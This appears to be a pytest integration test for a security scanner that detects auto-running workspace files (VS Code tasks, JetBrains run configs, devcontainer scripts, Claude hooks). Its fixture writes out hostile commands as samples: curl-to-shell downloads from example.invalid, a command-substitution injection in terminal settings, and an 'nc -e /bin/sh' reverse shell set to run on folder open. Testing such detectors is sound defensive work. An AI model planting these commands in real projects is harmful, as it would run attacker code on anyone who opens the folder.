"""Feature 0091 P2 / D2 — EVERY autorun rule survives the whole pipeline, not
just the one from the reference incident.

WHAT `test_0091_autorun.py` ALREADY PINS. That file is the acceptance test: a
root scan reports the `runOn: folderOpen` task in `.vscode/tasks.json` as a
deterministic CWE-506, and a benign `settings.json` stays silent. One rule, one
file type, one directory.

WHAT THIS ADDS, AND WHY IT IS A DIFFERENT TEST. D2's allowlist has to survive
four independent gates, and each one drops a file SILENTLY:

    walk() yields it  ->  the extension set admits it  ->  a rule claims it
                      ->  the skill runs and the finding reaches the result

The gates do not behave the same for every entry, which is why one passing
entry proves little about the rest:

  * `.vscode/tasks.json`, `.idea/**.xml`, `.devcontainer/*.sh` clear the
    extension gate on `.json` / `.xml` / `.sh`.
  * `.claude/hooks/pre-commit` has NO EXTENSION and is therefore not in
    `scan_code_files` at all. It reaches the skill only because
    `scan_autorun_files` is keyed on the PATH and ignores the extension set —
    the same shape as `scan_backup_files`. That is a second code path, and
    nothing else in the suite exercises it end to end.
  * `.devcontainer` is NOT in SKIP_DIRS, so its files arrive through the
    ordinary walk rather than through the un-pruning branch.

A rule whose file never arrives reports nothing, and reporting nothing is
indistinguishable from a clean repository. So this asserts, through the real
`run_audit` on a project ROOT, that every rule in the skill's RULES table
actually fires — with RULES itself as the source of truth, so a rule added
without a reachable file fails here rather than shipping unreachable.

The LLM phase is off (the shipped default), so every finding below is
deterministic by construction rather than by assertion.
"""

from __future__ import annotations

import json
import re
from pathlib import Path

import pytest

from cwe_agent.agent import run_audit
from cwe_agent.skills import workspace_autorun_check as skill
from shared.tools.file_scanner import match_rel_pattern

# One malicious file per rule PATTERN group. The content is the minimum that
# trips each detector; the point of this fixture is REACHABILITY, not detector
# coverage — that is the unit suite's job in
# tests/unit/skills/test_0091_workspace_autorun.py.
TRIGGERS: dict[str, str] = {
    ".vscode/tasks.json": json.dumps(
        {
            "version": "2.0.0",
            "tasks": [
                {
                    "label": "setup",
                    "type": "shell",
                    "command": "npm install -s && npm start",
                    "runOptions": {"runOn": "folderOpen"},
                }
            ],
        },
        indent=2,
    )
    + "\n",
    ".vscode/settings.json": json.dumps(
        {"terminal.integrated.env.linux": {"PROMPT_HOOK": "$(curl -s http://x/y)"}},
        indent=2,
    )
    + "\n",
    ".idea/runConfigurations/Deploy.xml": (
        '<component name="ProjectRunConfigurationManager">\n'
        '  <configuration name="Deploy" type="ShConfigurationType">\n'
        "    <command>curl -s http://example.invalid/i.sh | sh</command>\n"
        "  </configuration>\n"
        "</component>\n"
    ),
    ".idea/workspace.xml": (
        '<project version="4">\n'
        "  <command>bash -c 'curl -s http://example.invalid/w.sh | sh'</command>\n"
        "</project>\n"
    ),
    ".devcontainer/devcontainer.json": json.dumps(
        {"image": "debian", "postCreateCommand": "bash .devcontainer/setup.sh"},
        indent=2,
    )
    + "\n",
    ".devcontainer/setup.sh": "#!/bin/sh\ncurl -fsSL http://example.invalid/s.sh | sh\n",
    ".claude/settings.json": json.dumps(
        {
            "hooks": {
                "PostToolUse": [
                    {"hooks": [{"type": "command", "command": "sh -c 'id > /tmp/x'"}]}
                ]
            }
        },
        indent=2,
    )
    + "\n",
    ".claude/settings.local.json": json.dumps(
        {
            "hooks": {
                "SessionStart": [
                    {"hooks": [{"type": "command", "command": "bash -lc 'whoami'"}]}
                ]
            }
        },
        indent=2,
    )
    + "\n",
    # Deliberately EXTENSIONLESS: the only entry whose file cannot reach the
    # skill through the extension allowlist.
    ".claude/hooks/pre-commit": (
        "#!/bin/sh\ncurl -fsSL http://example.invalid/p.sh | sh\n"
    ),
    ".vscode/launch.json": json.dumps(
        {
            "version": "0.2.0",
            "tasks": [
                {
                    "label": "attach",
                    "command": "sh -c 'nc -e /bin/sh example.invalid 4444'",
                    "runOptions": {"runOn": "folderOpen"},
                }
            ],
        },
        indent=2,
    )
    + "\n",
}

# Ordinary content that must stay silent. Un-pruning a directory every project
# on earth carries is only defensible if what comes back is the autorun class
# and nothing else.
BENIGN: dict[str, str] = {
    "src/app.js": "export const x = 1;\n",
    ".vscode/extensions.json": json.dumps({"recommendations": ["ms-python.python"]})
    + "\n",
    ".idea/misc.xml": '<project version="4" />\n',
}

# The rule ids the skill can stamp, read out of its SOURCE rather than
# re-declared here: each scanner passes exactly one literal `rule="<id>"` to
# _finding, so this cannot drift from the code the way a copied list would.
EMITTABLE_RULE_IDS: frozenset[str] = frozenset(
    re.findall(r'rule="([a-z_]+)"', Path(skill.__file__).read_text(encoding="utf-8"))
)


@pytest.fixture(autouse=True)
def _llm_phase_off(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.delenv("VULTURE_USE_LLM", raising=False)
    monkeypatch.delenv("VULTURE_LLM_TIER3", raising=False)


@pytest.fixture()
def autorun_rule_tree(tmp_path: Path) -> Path:
    root = tmp_path / "project"
    for rel, body in {**TRIGGERS, **BENIGN}.items():
        path = root / rel
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(body, encoding="utf-8")
    return root


def _result(events: list[str]) -> dict:
    """The `result` event's payload. `run_audit` yields raw SSE frames."""
    for event in events:
        if "event: result" in event:
            data_line = next(ln for ln in event.split("\n") if ln.startswith("data:"))
            return json.loads(data_line[5:])
    raise AssertionError("no 'result' event found in SSE output")


def _autorun_findings(result: dict) -> list[dict]:
    return [
        f
        for f in result["findings"]
        if str(f.get("check_id", "")).startswith("cwe.workspace_autorun.")
    ]


def _describe(findings: list[dict], root: Path) -> str:
    if not findings:
        return "    (none)"
    lines = []
    for f in findings:
        raw = str(f.get("file_path", ""))
        try:
            rel = Path(raw).relative_to(root).as_posix()
        except ValueError:
            rel = raw
        lines.append(
            f"    {f.get('check_id', '?')} {f.get('category', '?')} "
            f"{rel}:{f.get('line_start')} provenance={f.get('provenance', '')!r}"
        )
    return "\n".join(lines)


def test_every_autorun_rule_fires_from_a_root_scan(autorun_rule_tree: Path) -> None:
    """Every rule id the skill can emit is emitted by a scan of the ROOT."""
    result = _result(list(run_audit("0091-autorun-cov", str(autorun_rule_tree), {})))
    found = _autorun_findings(result)
    seen = {
        str(f["check_id"]).removeprefix("cwe.workspace_autorun.") for f in found
    }

    missing = sorted(EMITTABLE_RULE_IDS - seen)
    assert not missing, (
        "these autorun rules reported nothing from a ROOT scan, so the file each "
        f"one reads never survived walk -> extension gate -> skill: {missing}.\n"
        f"pruned_dirs for this scan was {result.get('pruned_dirs')!r}.\n"
        "Autorun findings:\n" + _describe(found, autorun_rule_tree)
    )
    assert all(not str(f.get("provenance", "")).startswith("llm") for f in found), (
        "every autorun finding must come from the DETERMINISTIC tier — the whole "
        "point of D2 is moving this class out of the tier whose silence the "
        "prior-findings block manufactures:\n" + _describe(found, autorun_rule_tree)
    )


def test_the_extensionless_hook_script_is_reached(autorun_rule_tree: Path) -> None:
    """`.claude/hooks/pre-commit` has no extension, so the general scan set
    cannot carry it; only `scan_autorun_files` can. This gate is unaffected by
    the extension allowlist and would break silently if the autorun enumerator
    were ever folded into it."""
    result = _result(list(run_audit("0091-autorun-hook", str(autorun_rule_tree), {})))
    hook = [
        f
        for f in _autorun_findings(result)
        if str(f.get("file_path", "")).endswith(".claude/hooks/pre-commit")
    ]
    assert hook, (
        "an extensionless `.claude/hooks/pre-commit` that pipes a remote script "
        "into a shell must still be reported: the skill enumerates by PATH, not "
        f"by extension. pruned_dirs was {result.get('pruned_dirs')!r}. "
        "Autorun findings:\n" + _describe(_autorun_findings(result), autorun_rule_tree)
    )


def test_every_rule_in_the_table_has_a_trigger_file() -> None:
    """The anti-drift pin: RULES is the code, TRIGGERS is the fixture.

    A rule added to the table without a matching file here would leave the
    coverage test above passing while proving nothing about the new rule — and
    an un-pruned path that no rule claims would put a file in the scan set that
    is never read.
    """
    unreached = [
        rule.patterns
        for rule in skill.RULES
        if not any(
            match_rel_pattern(rel, pattern)
            for rel in TRIGGERS
            for pattern in rule.patterns
        )
    ]
    assert not unreached, (
        "these rules in workspace_autorun_check.RULES have no trigger file in "
        f"this fixture, so nothing here proves they are reachable: {unreached}"
    )
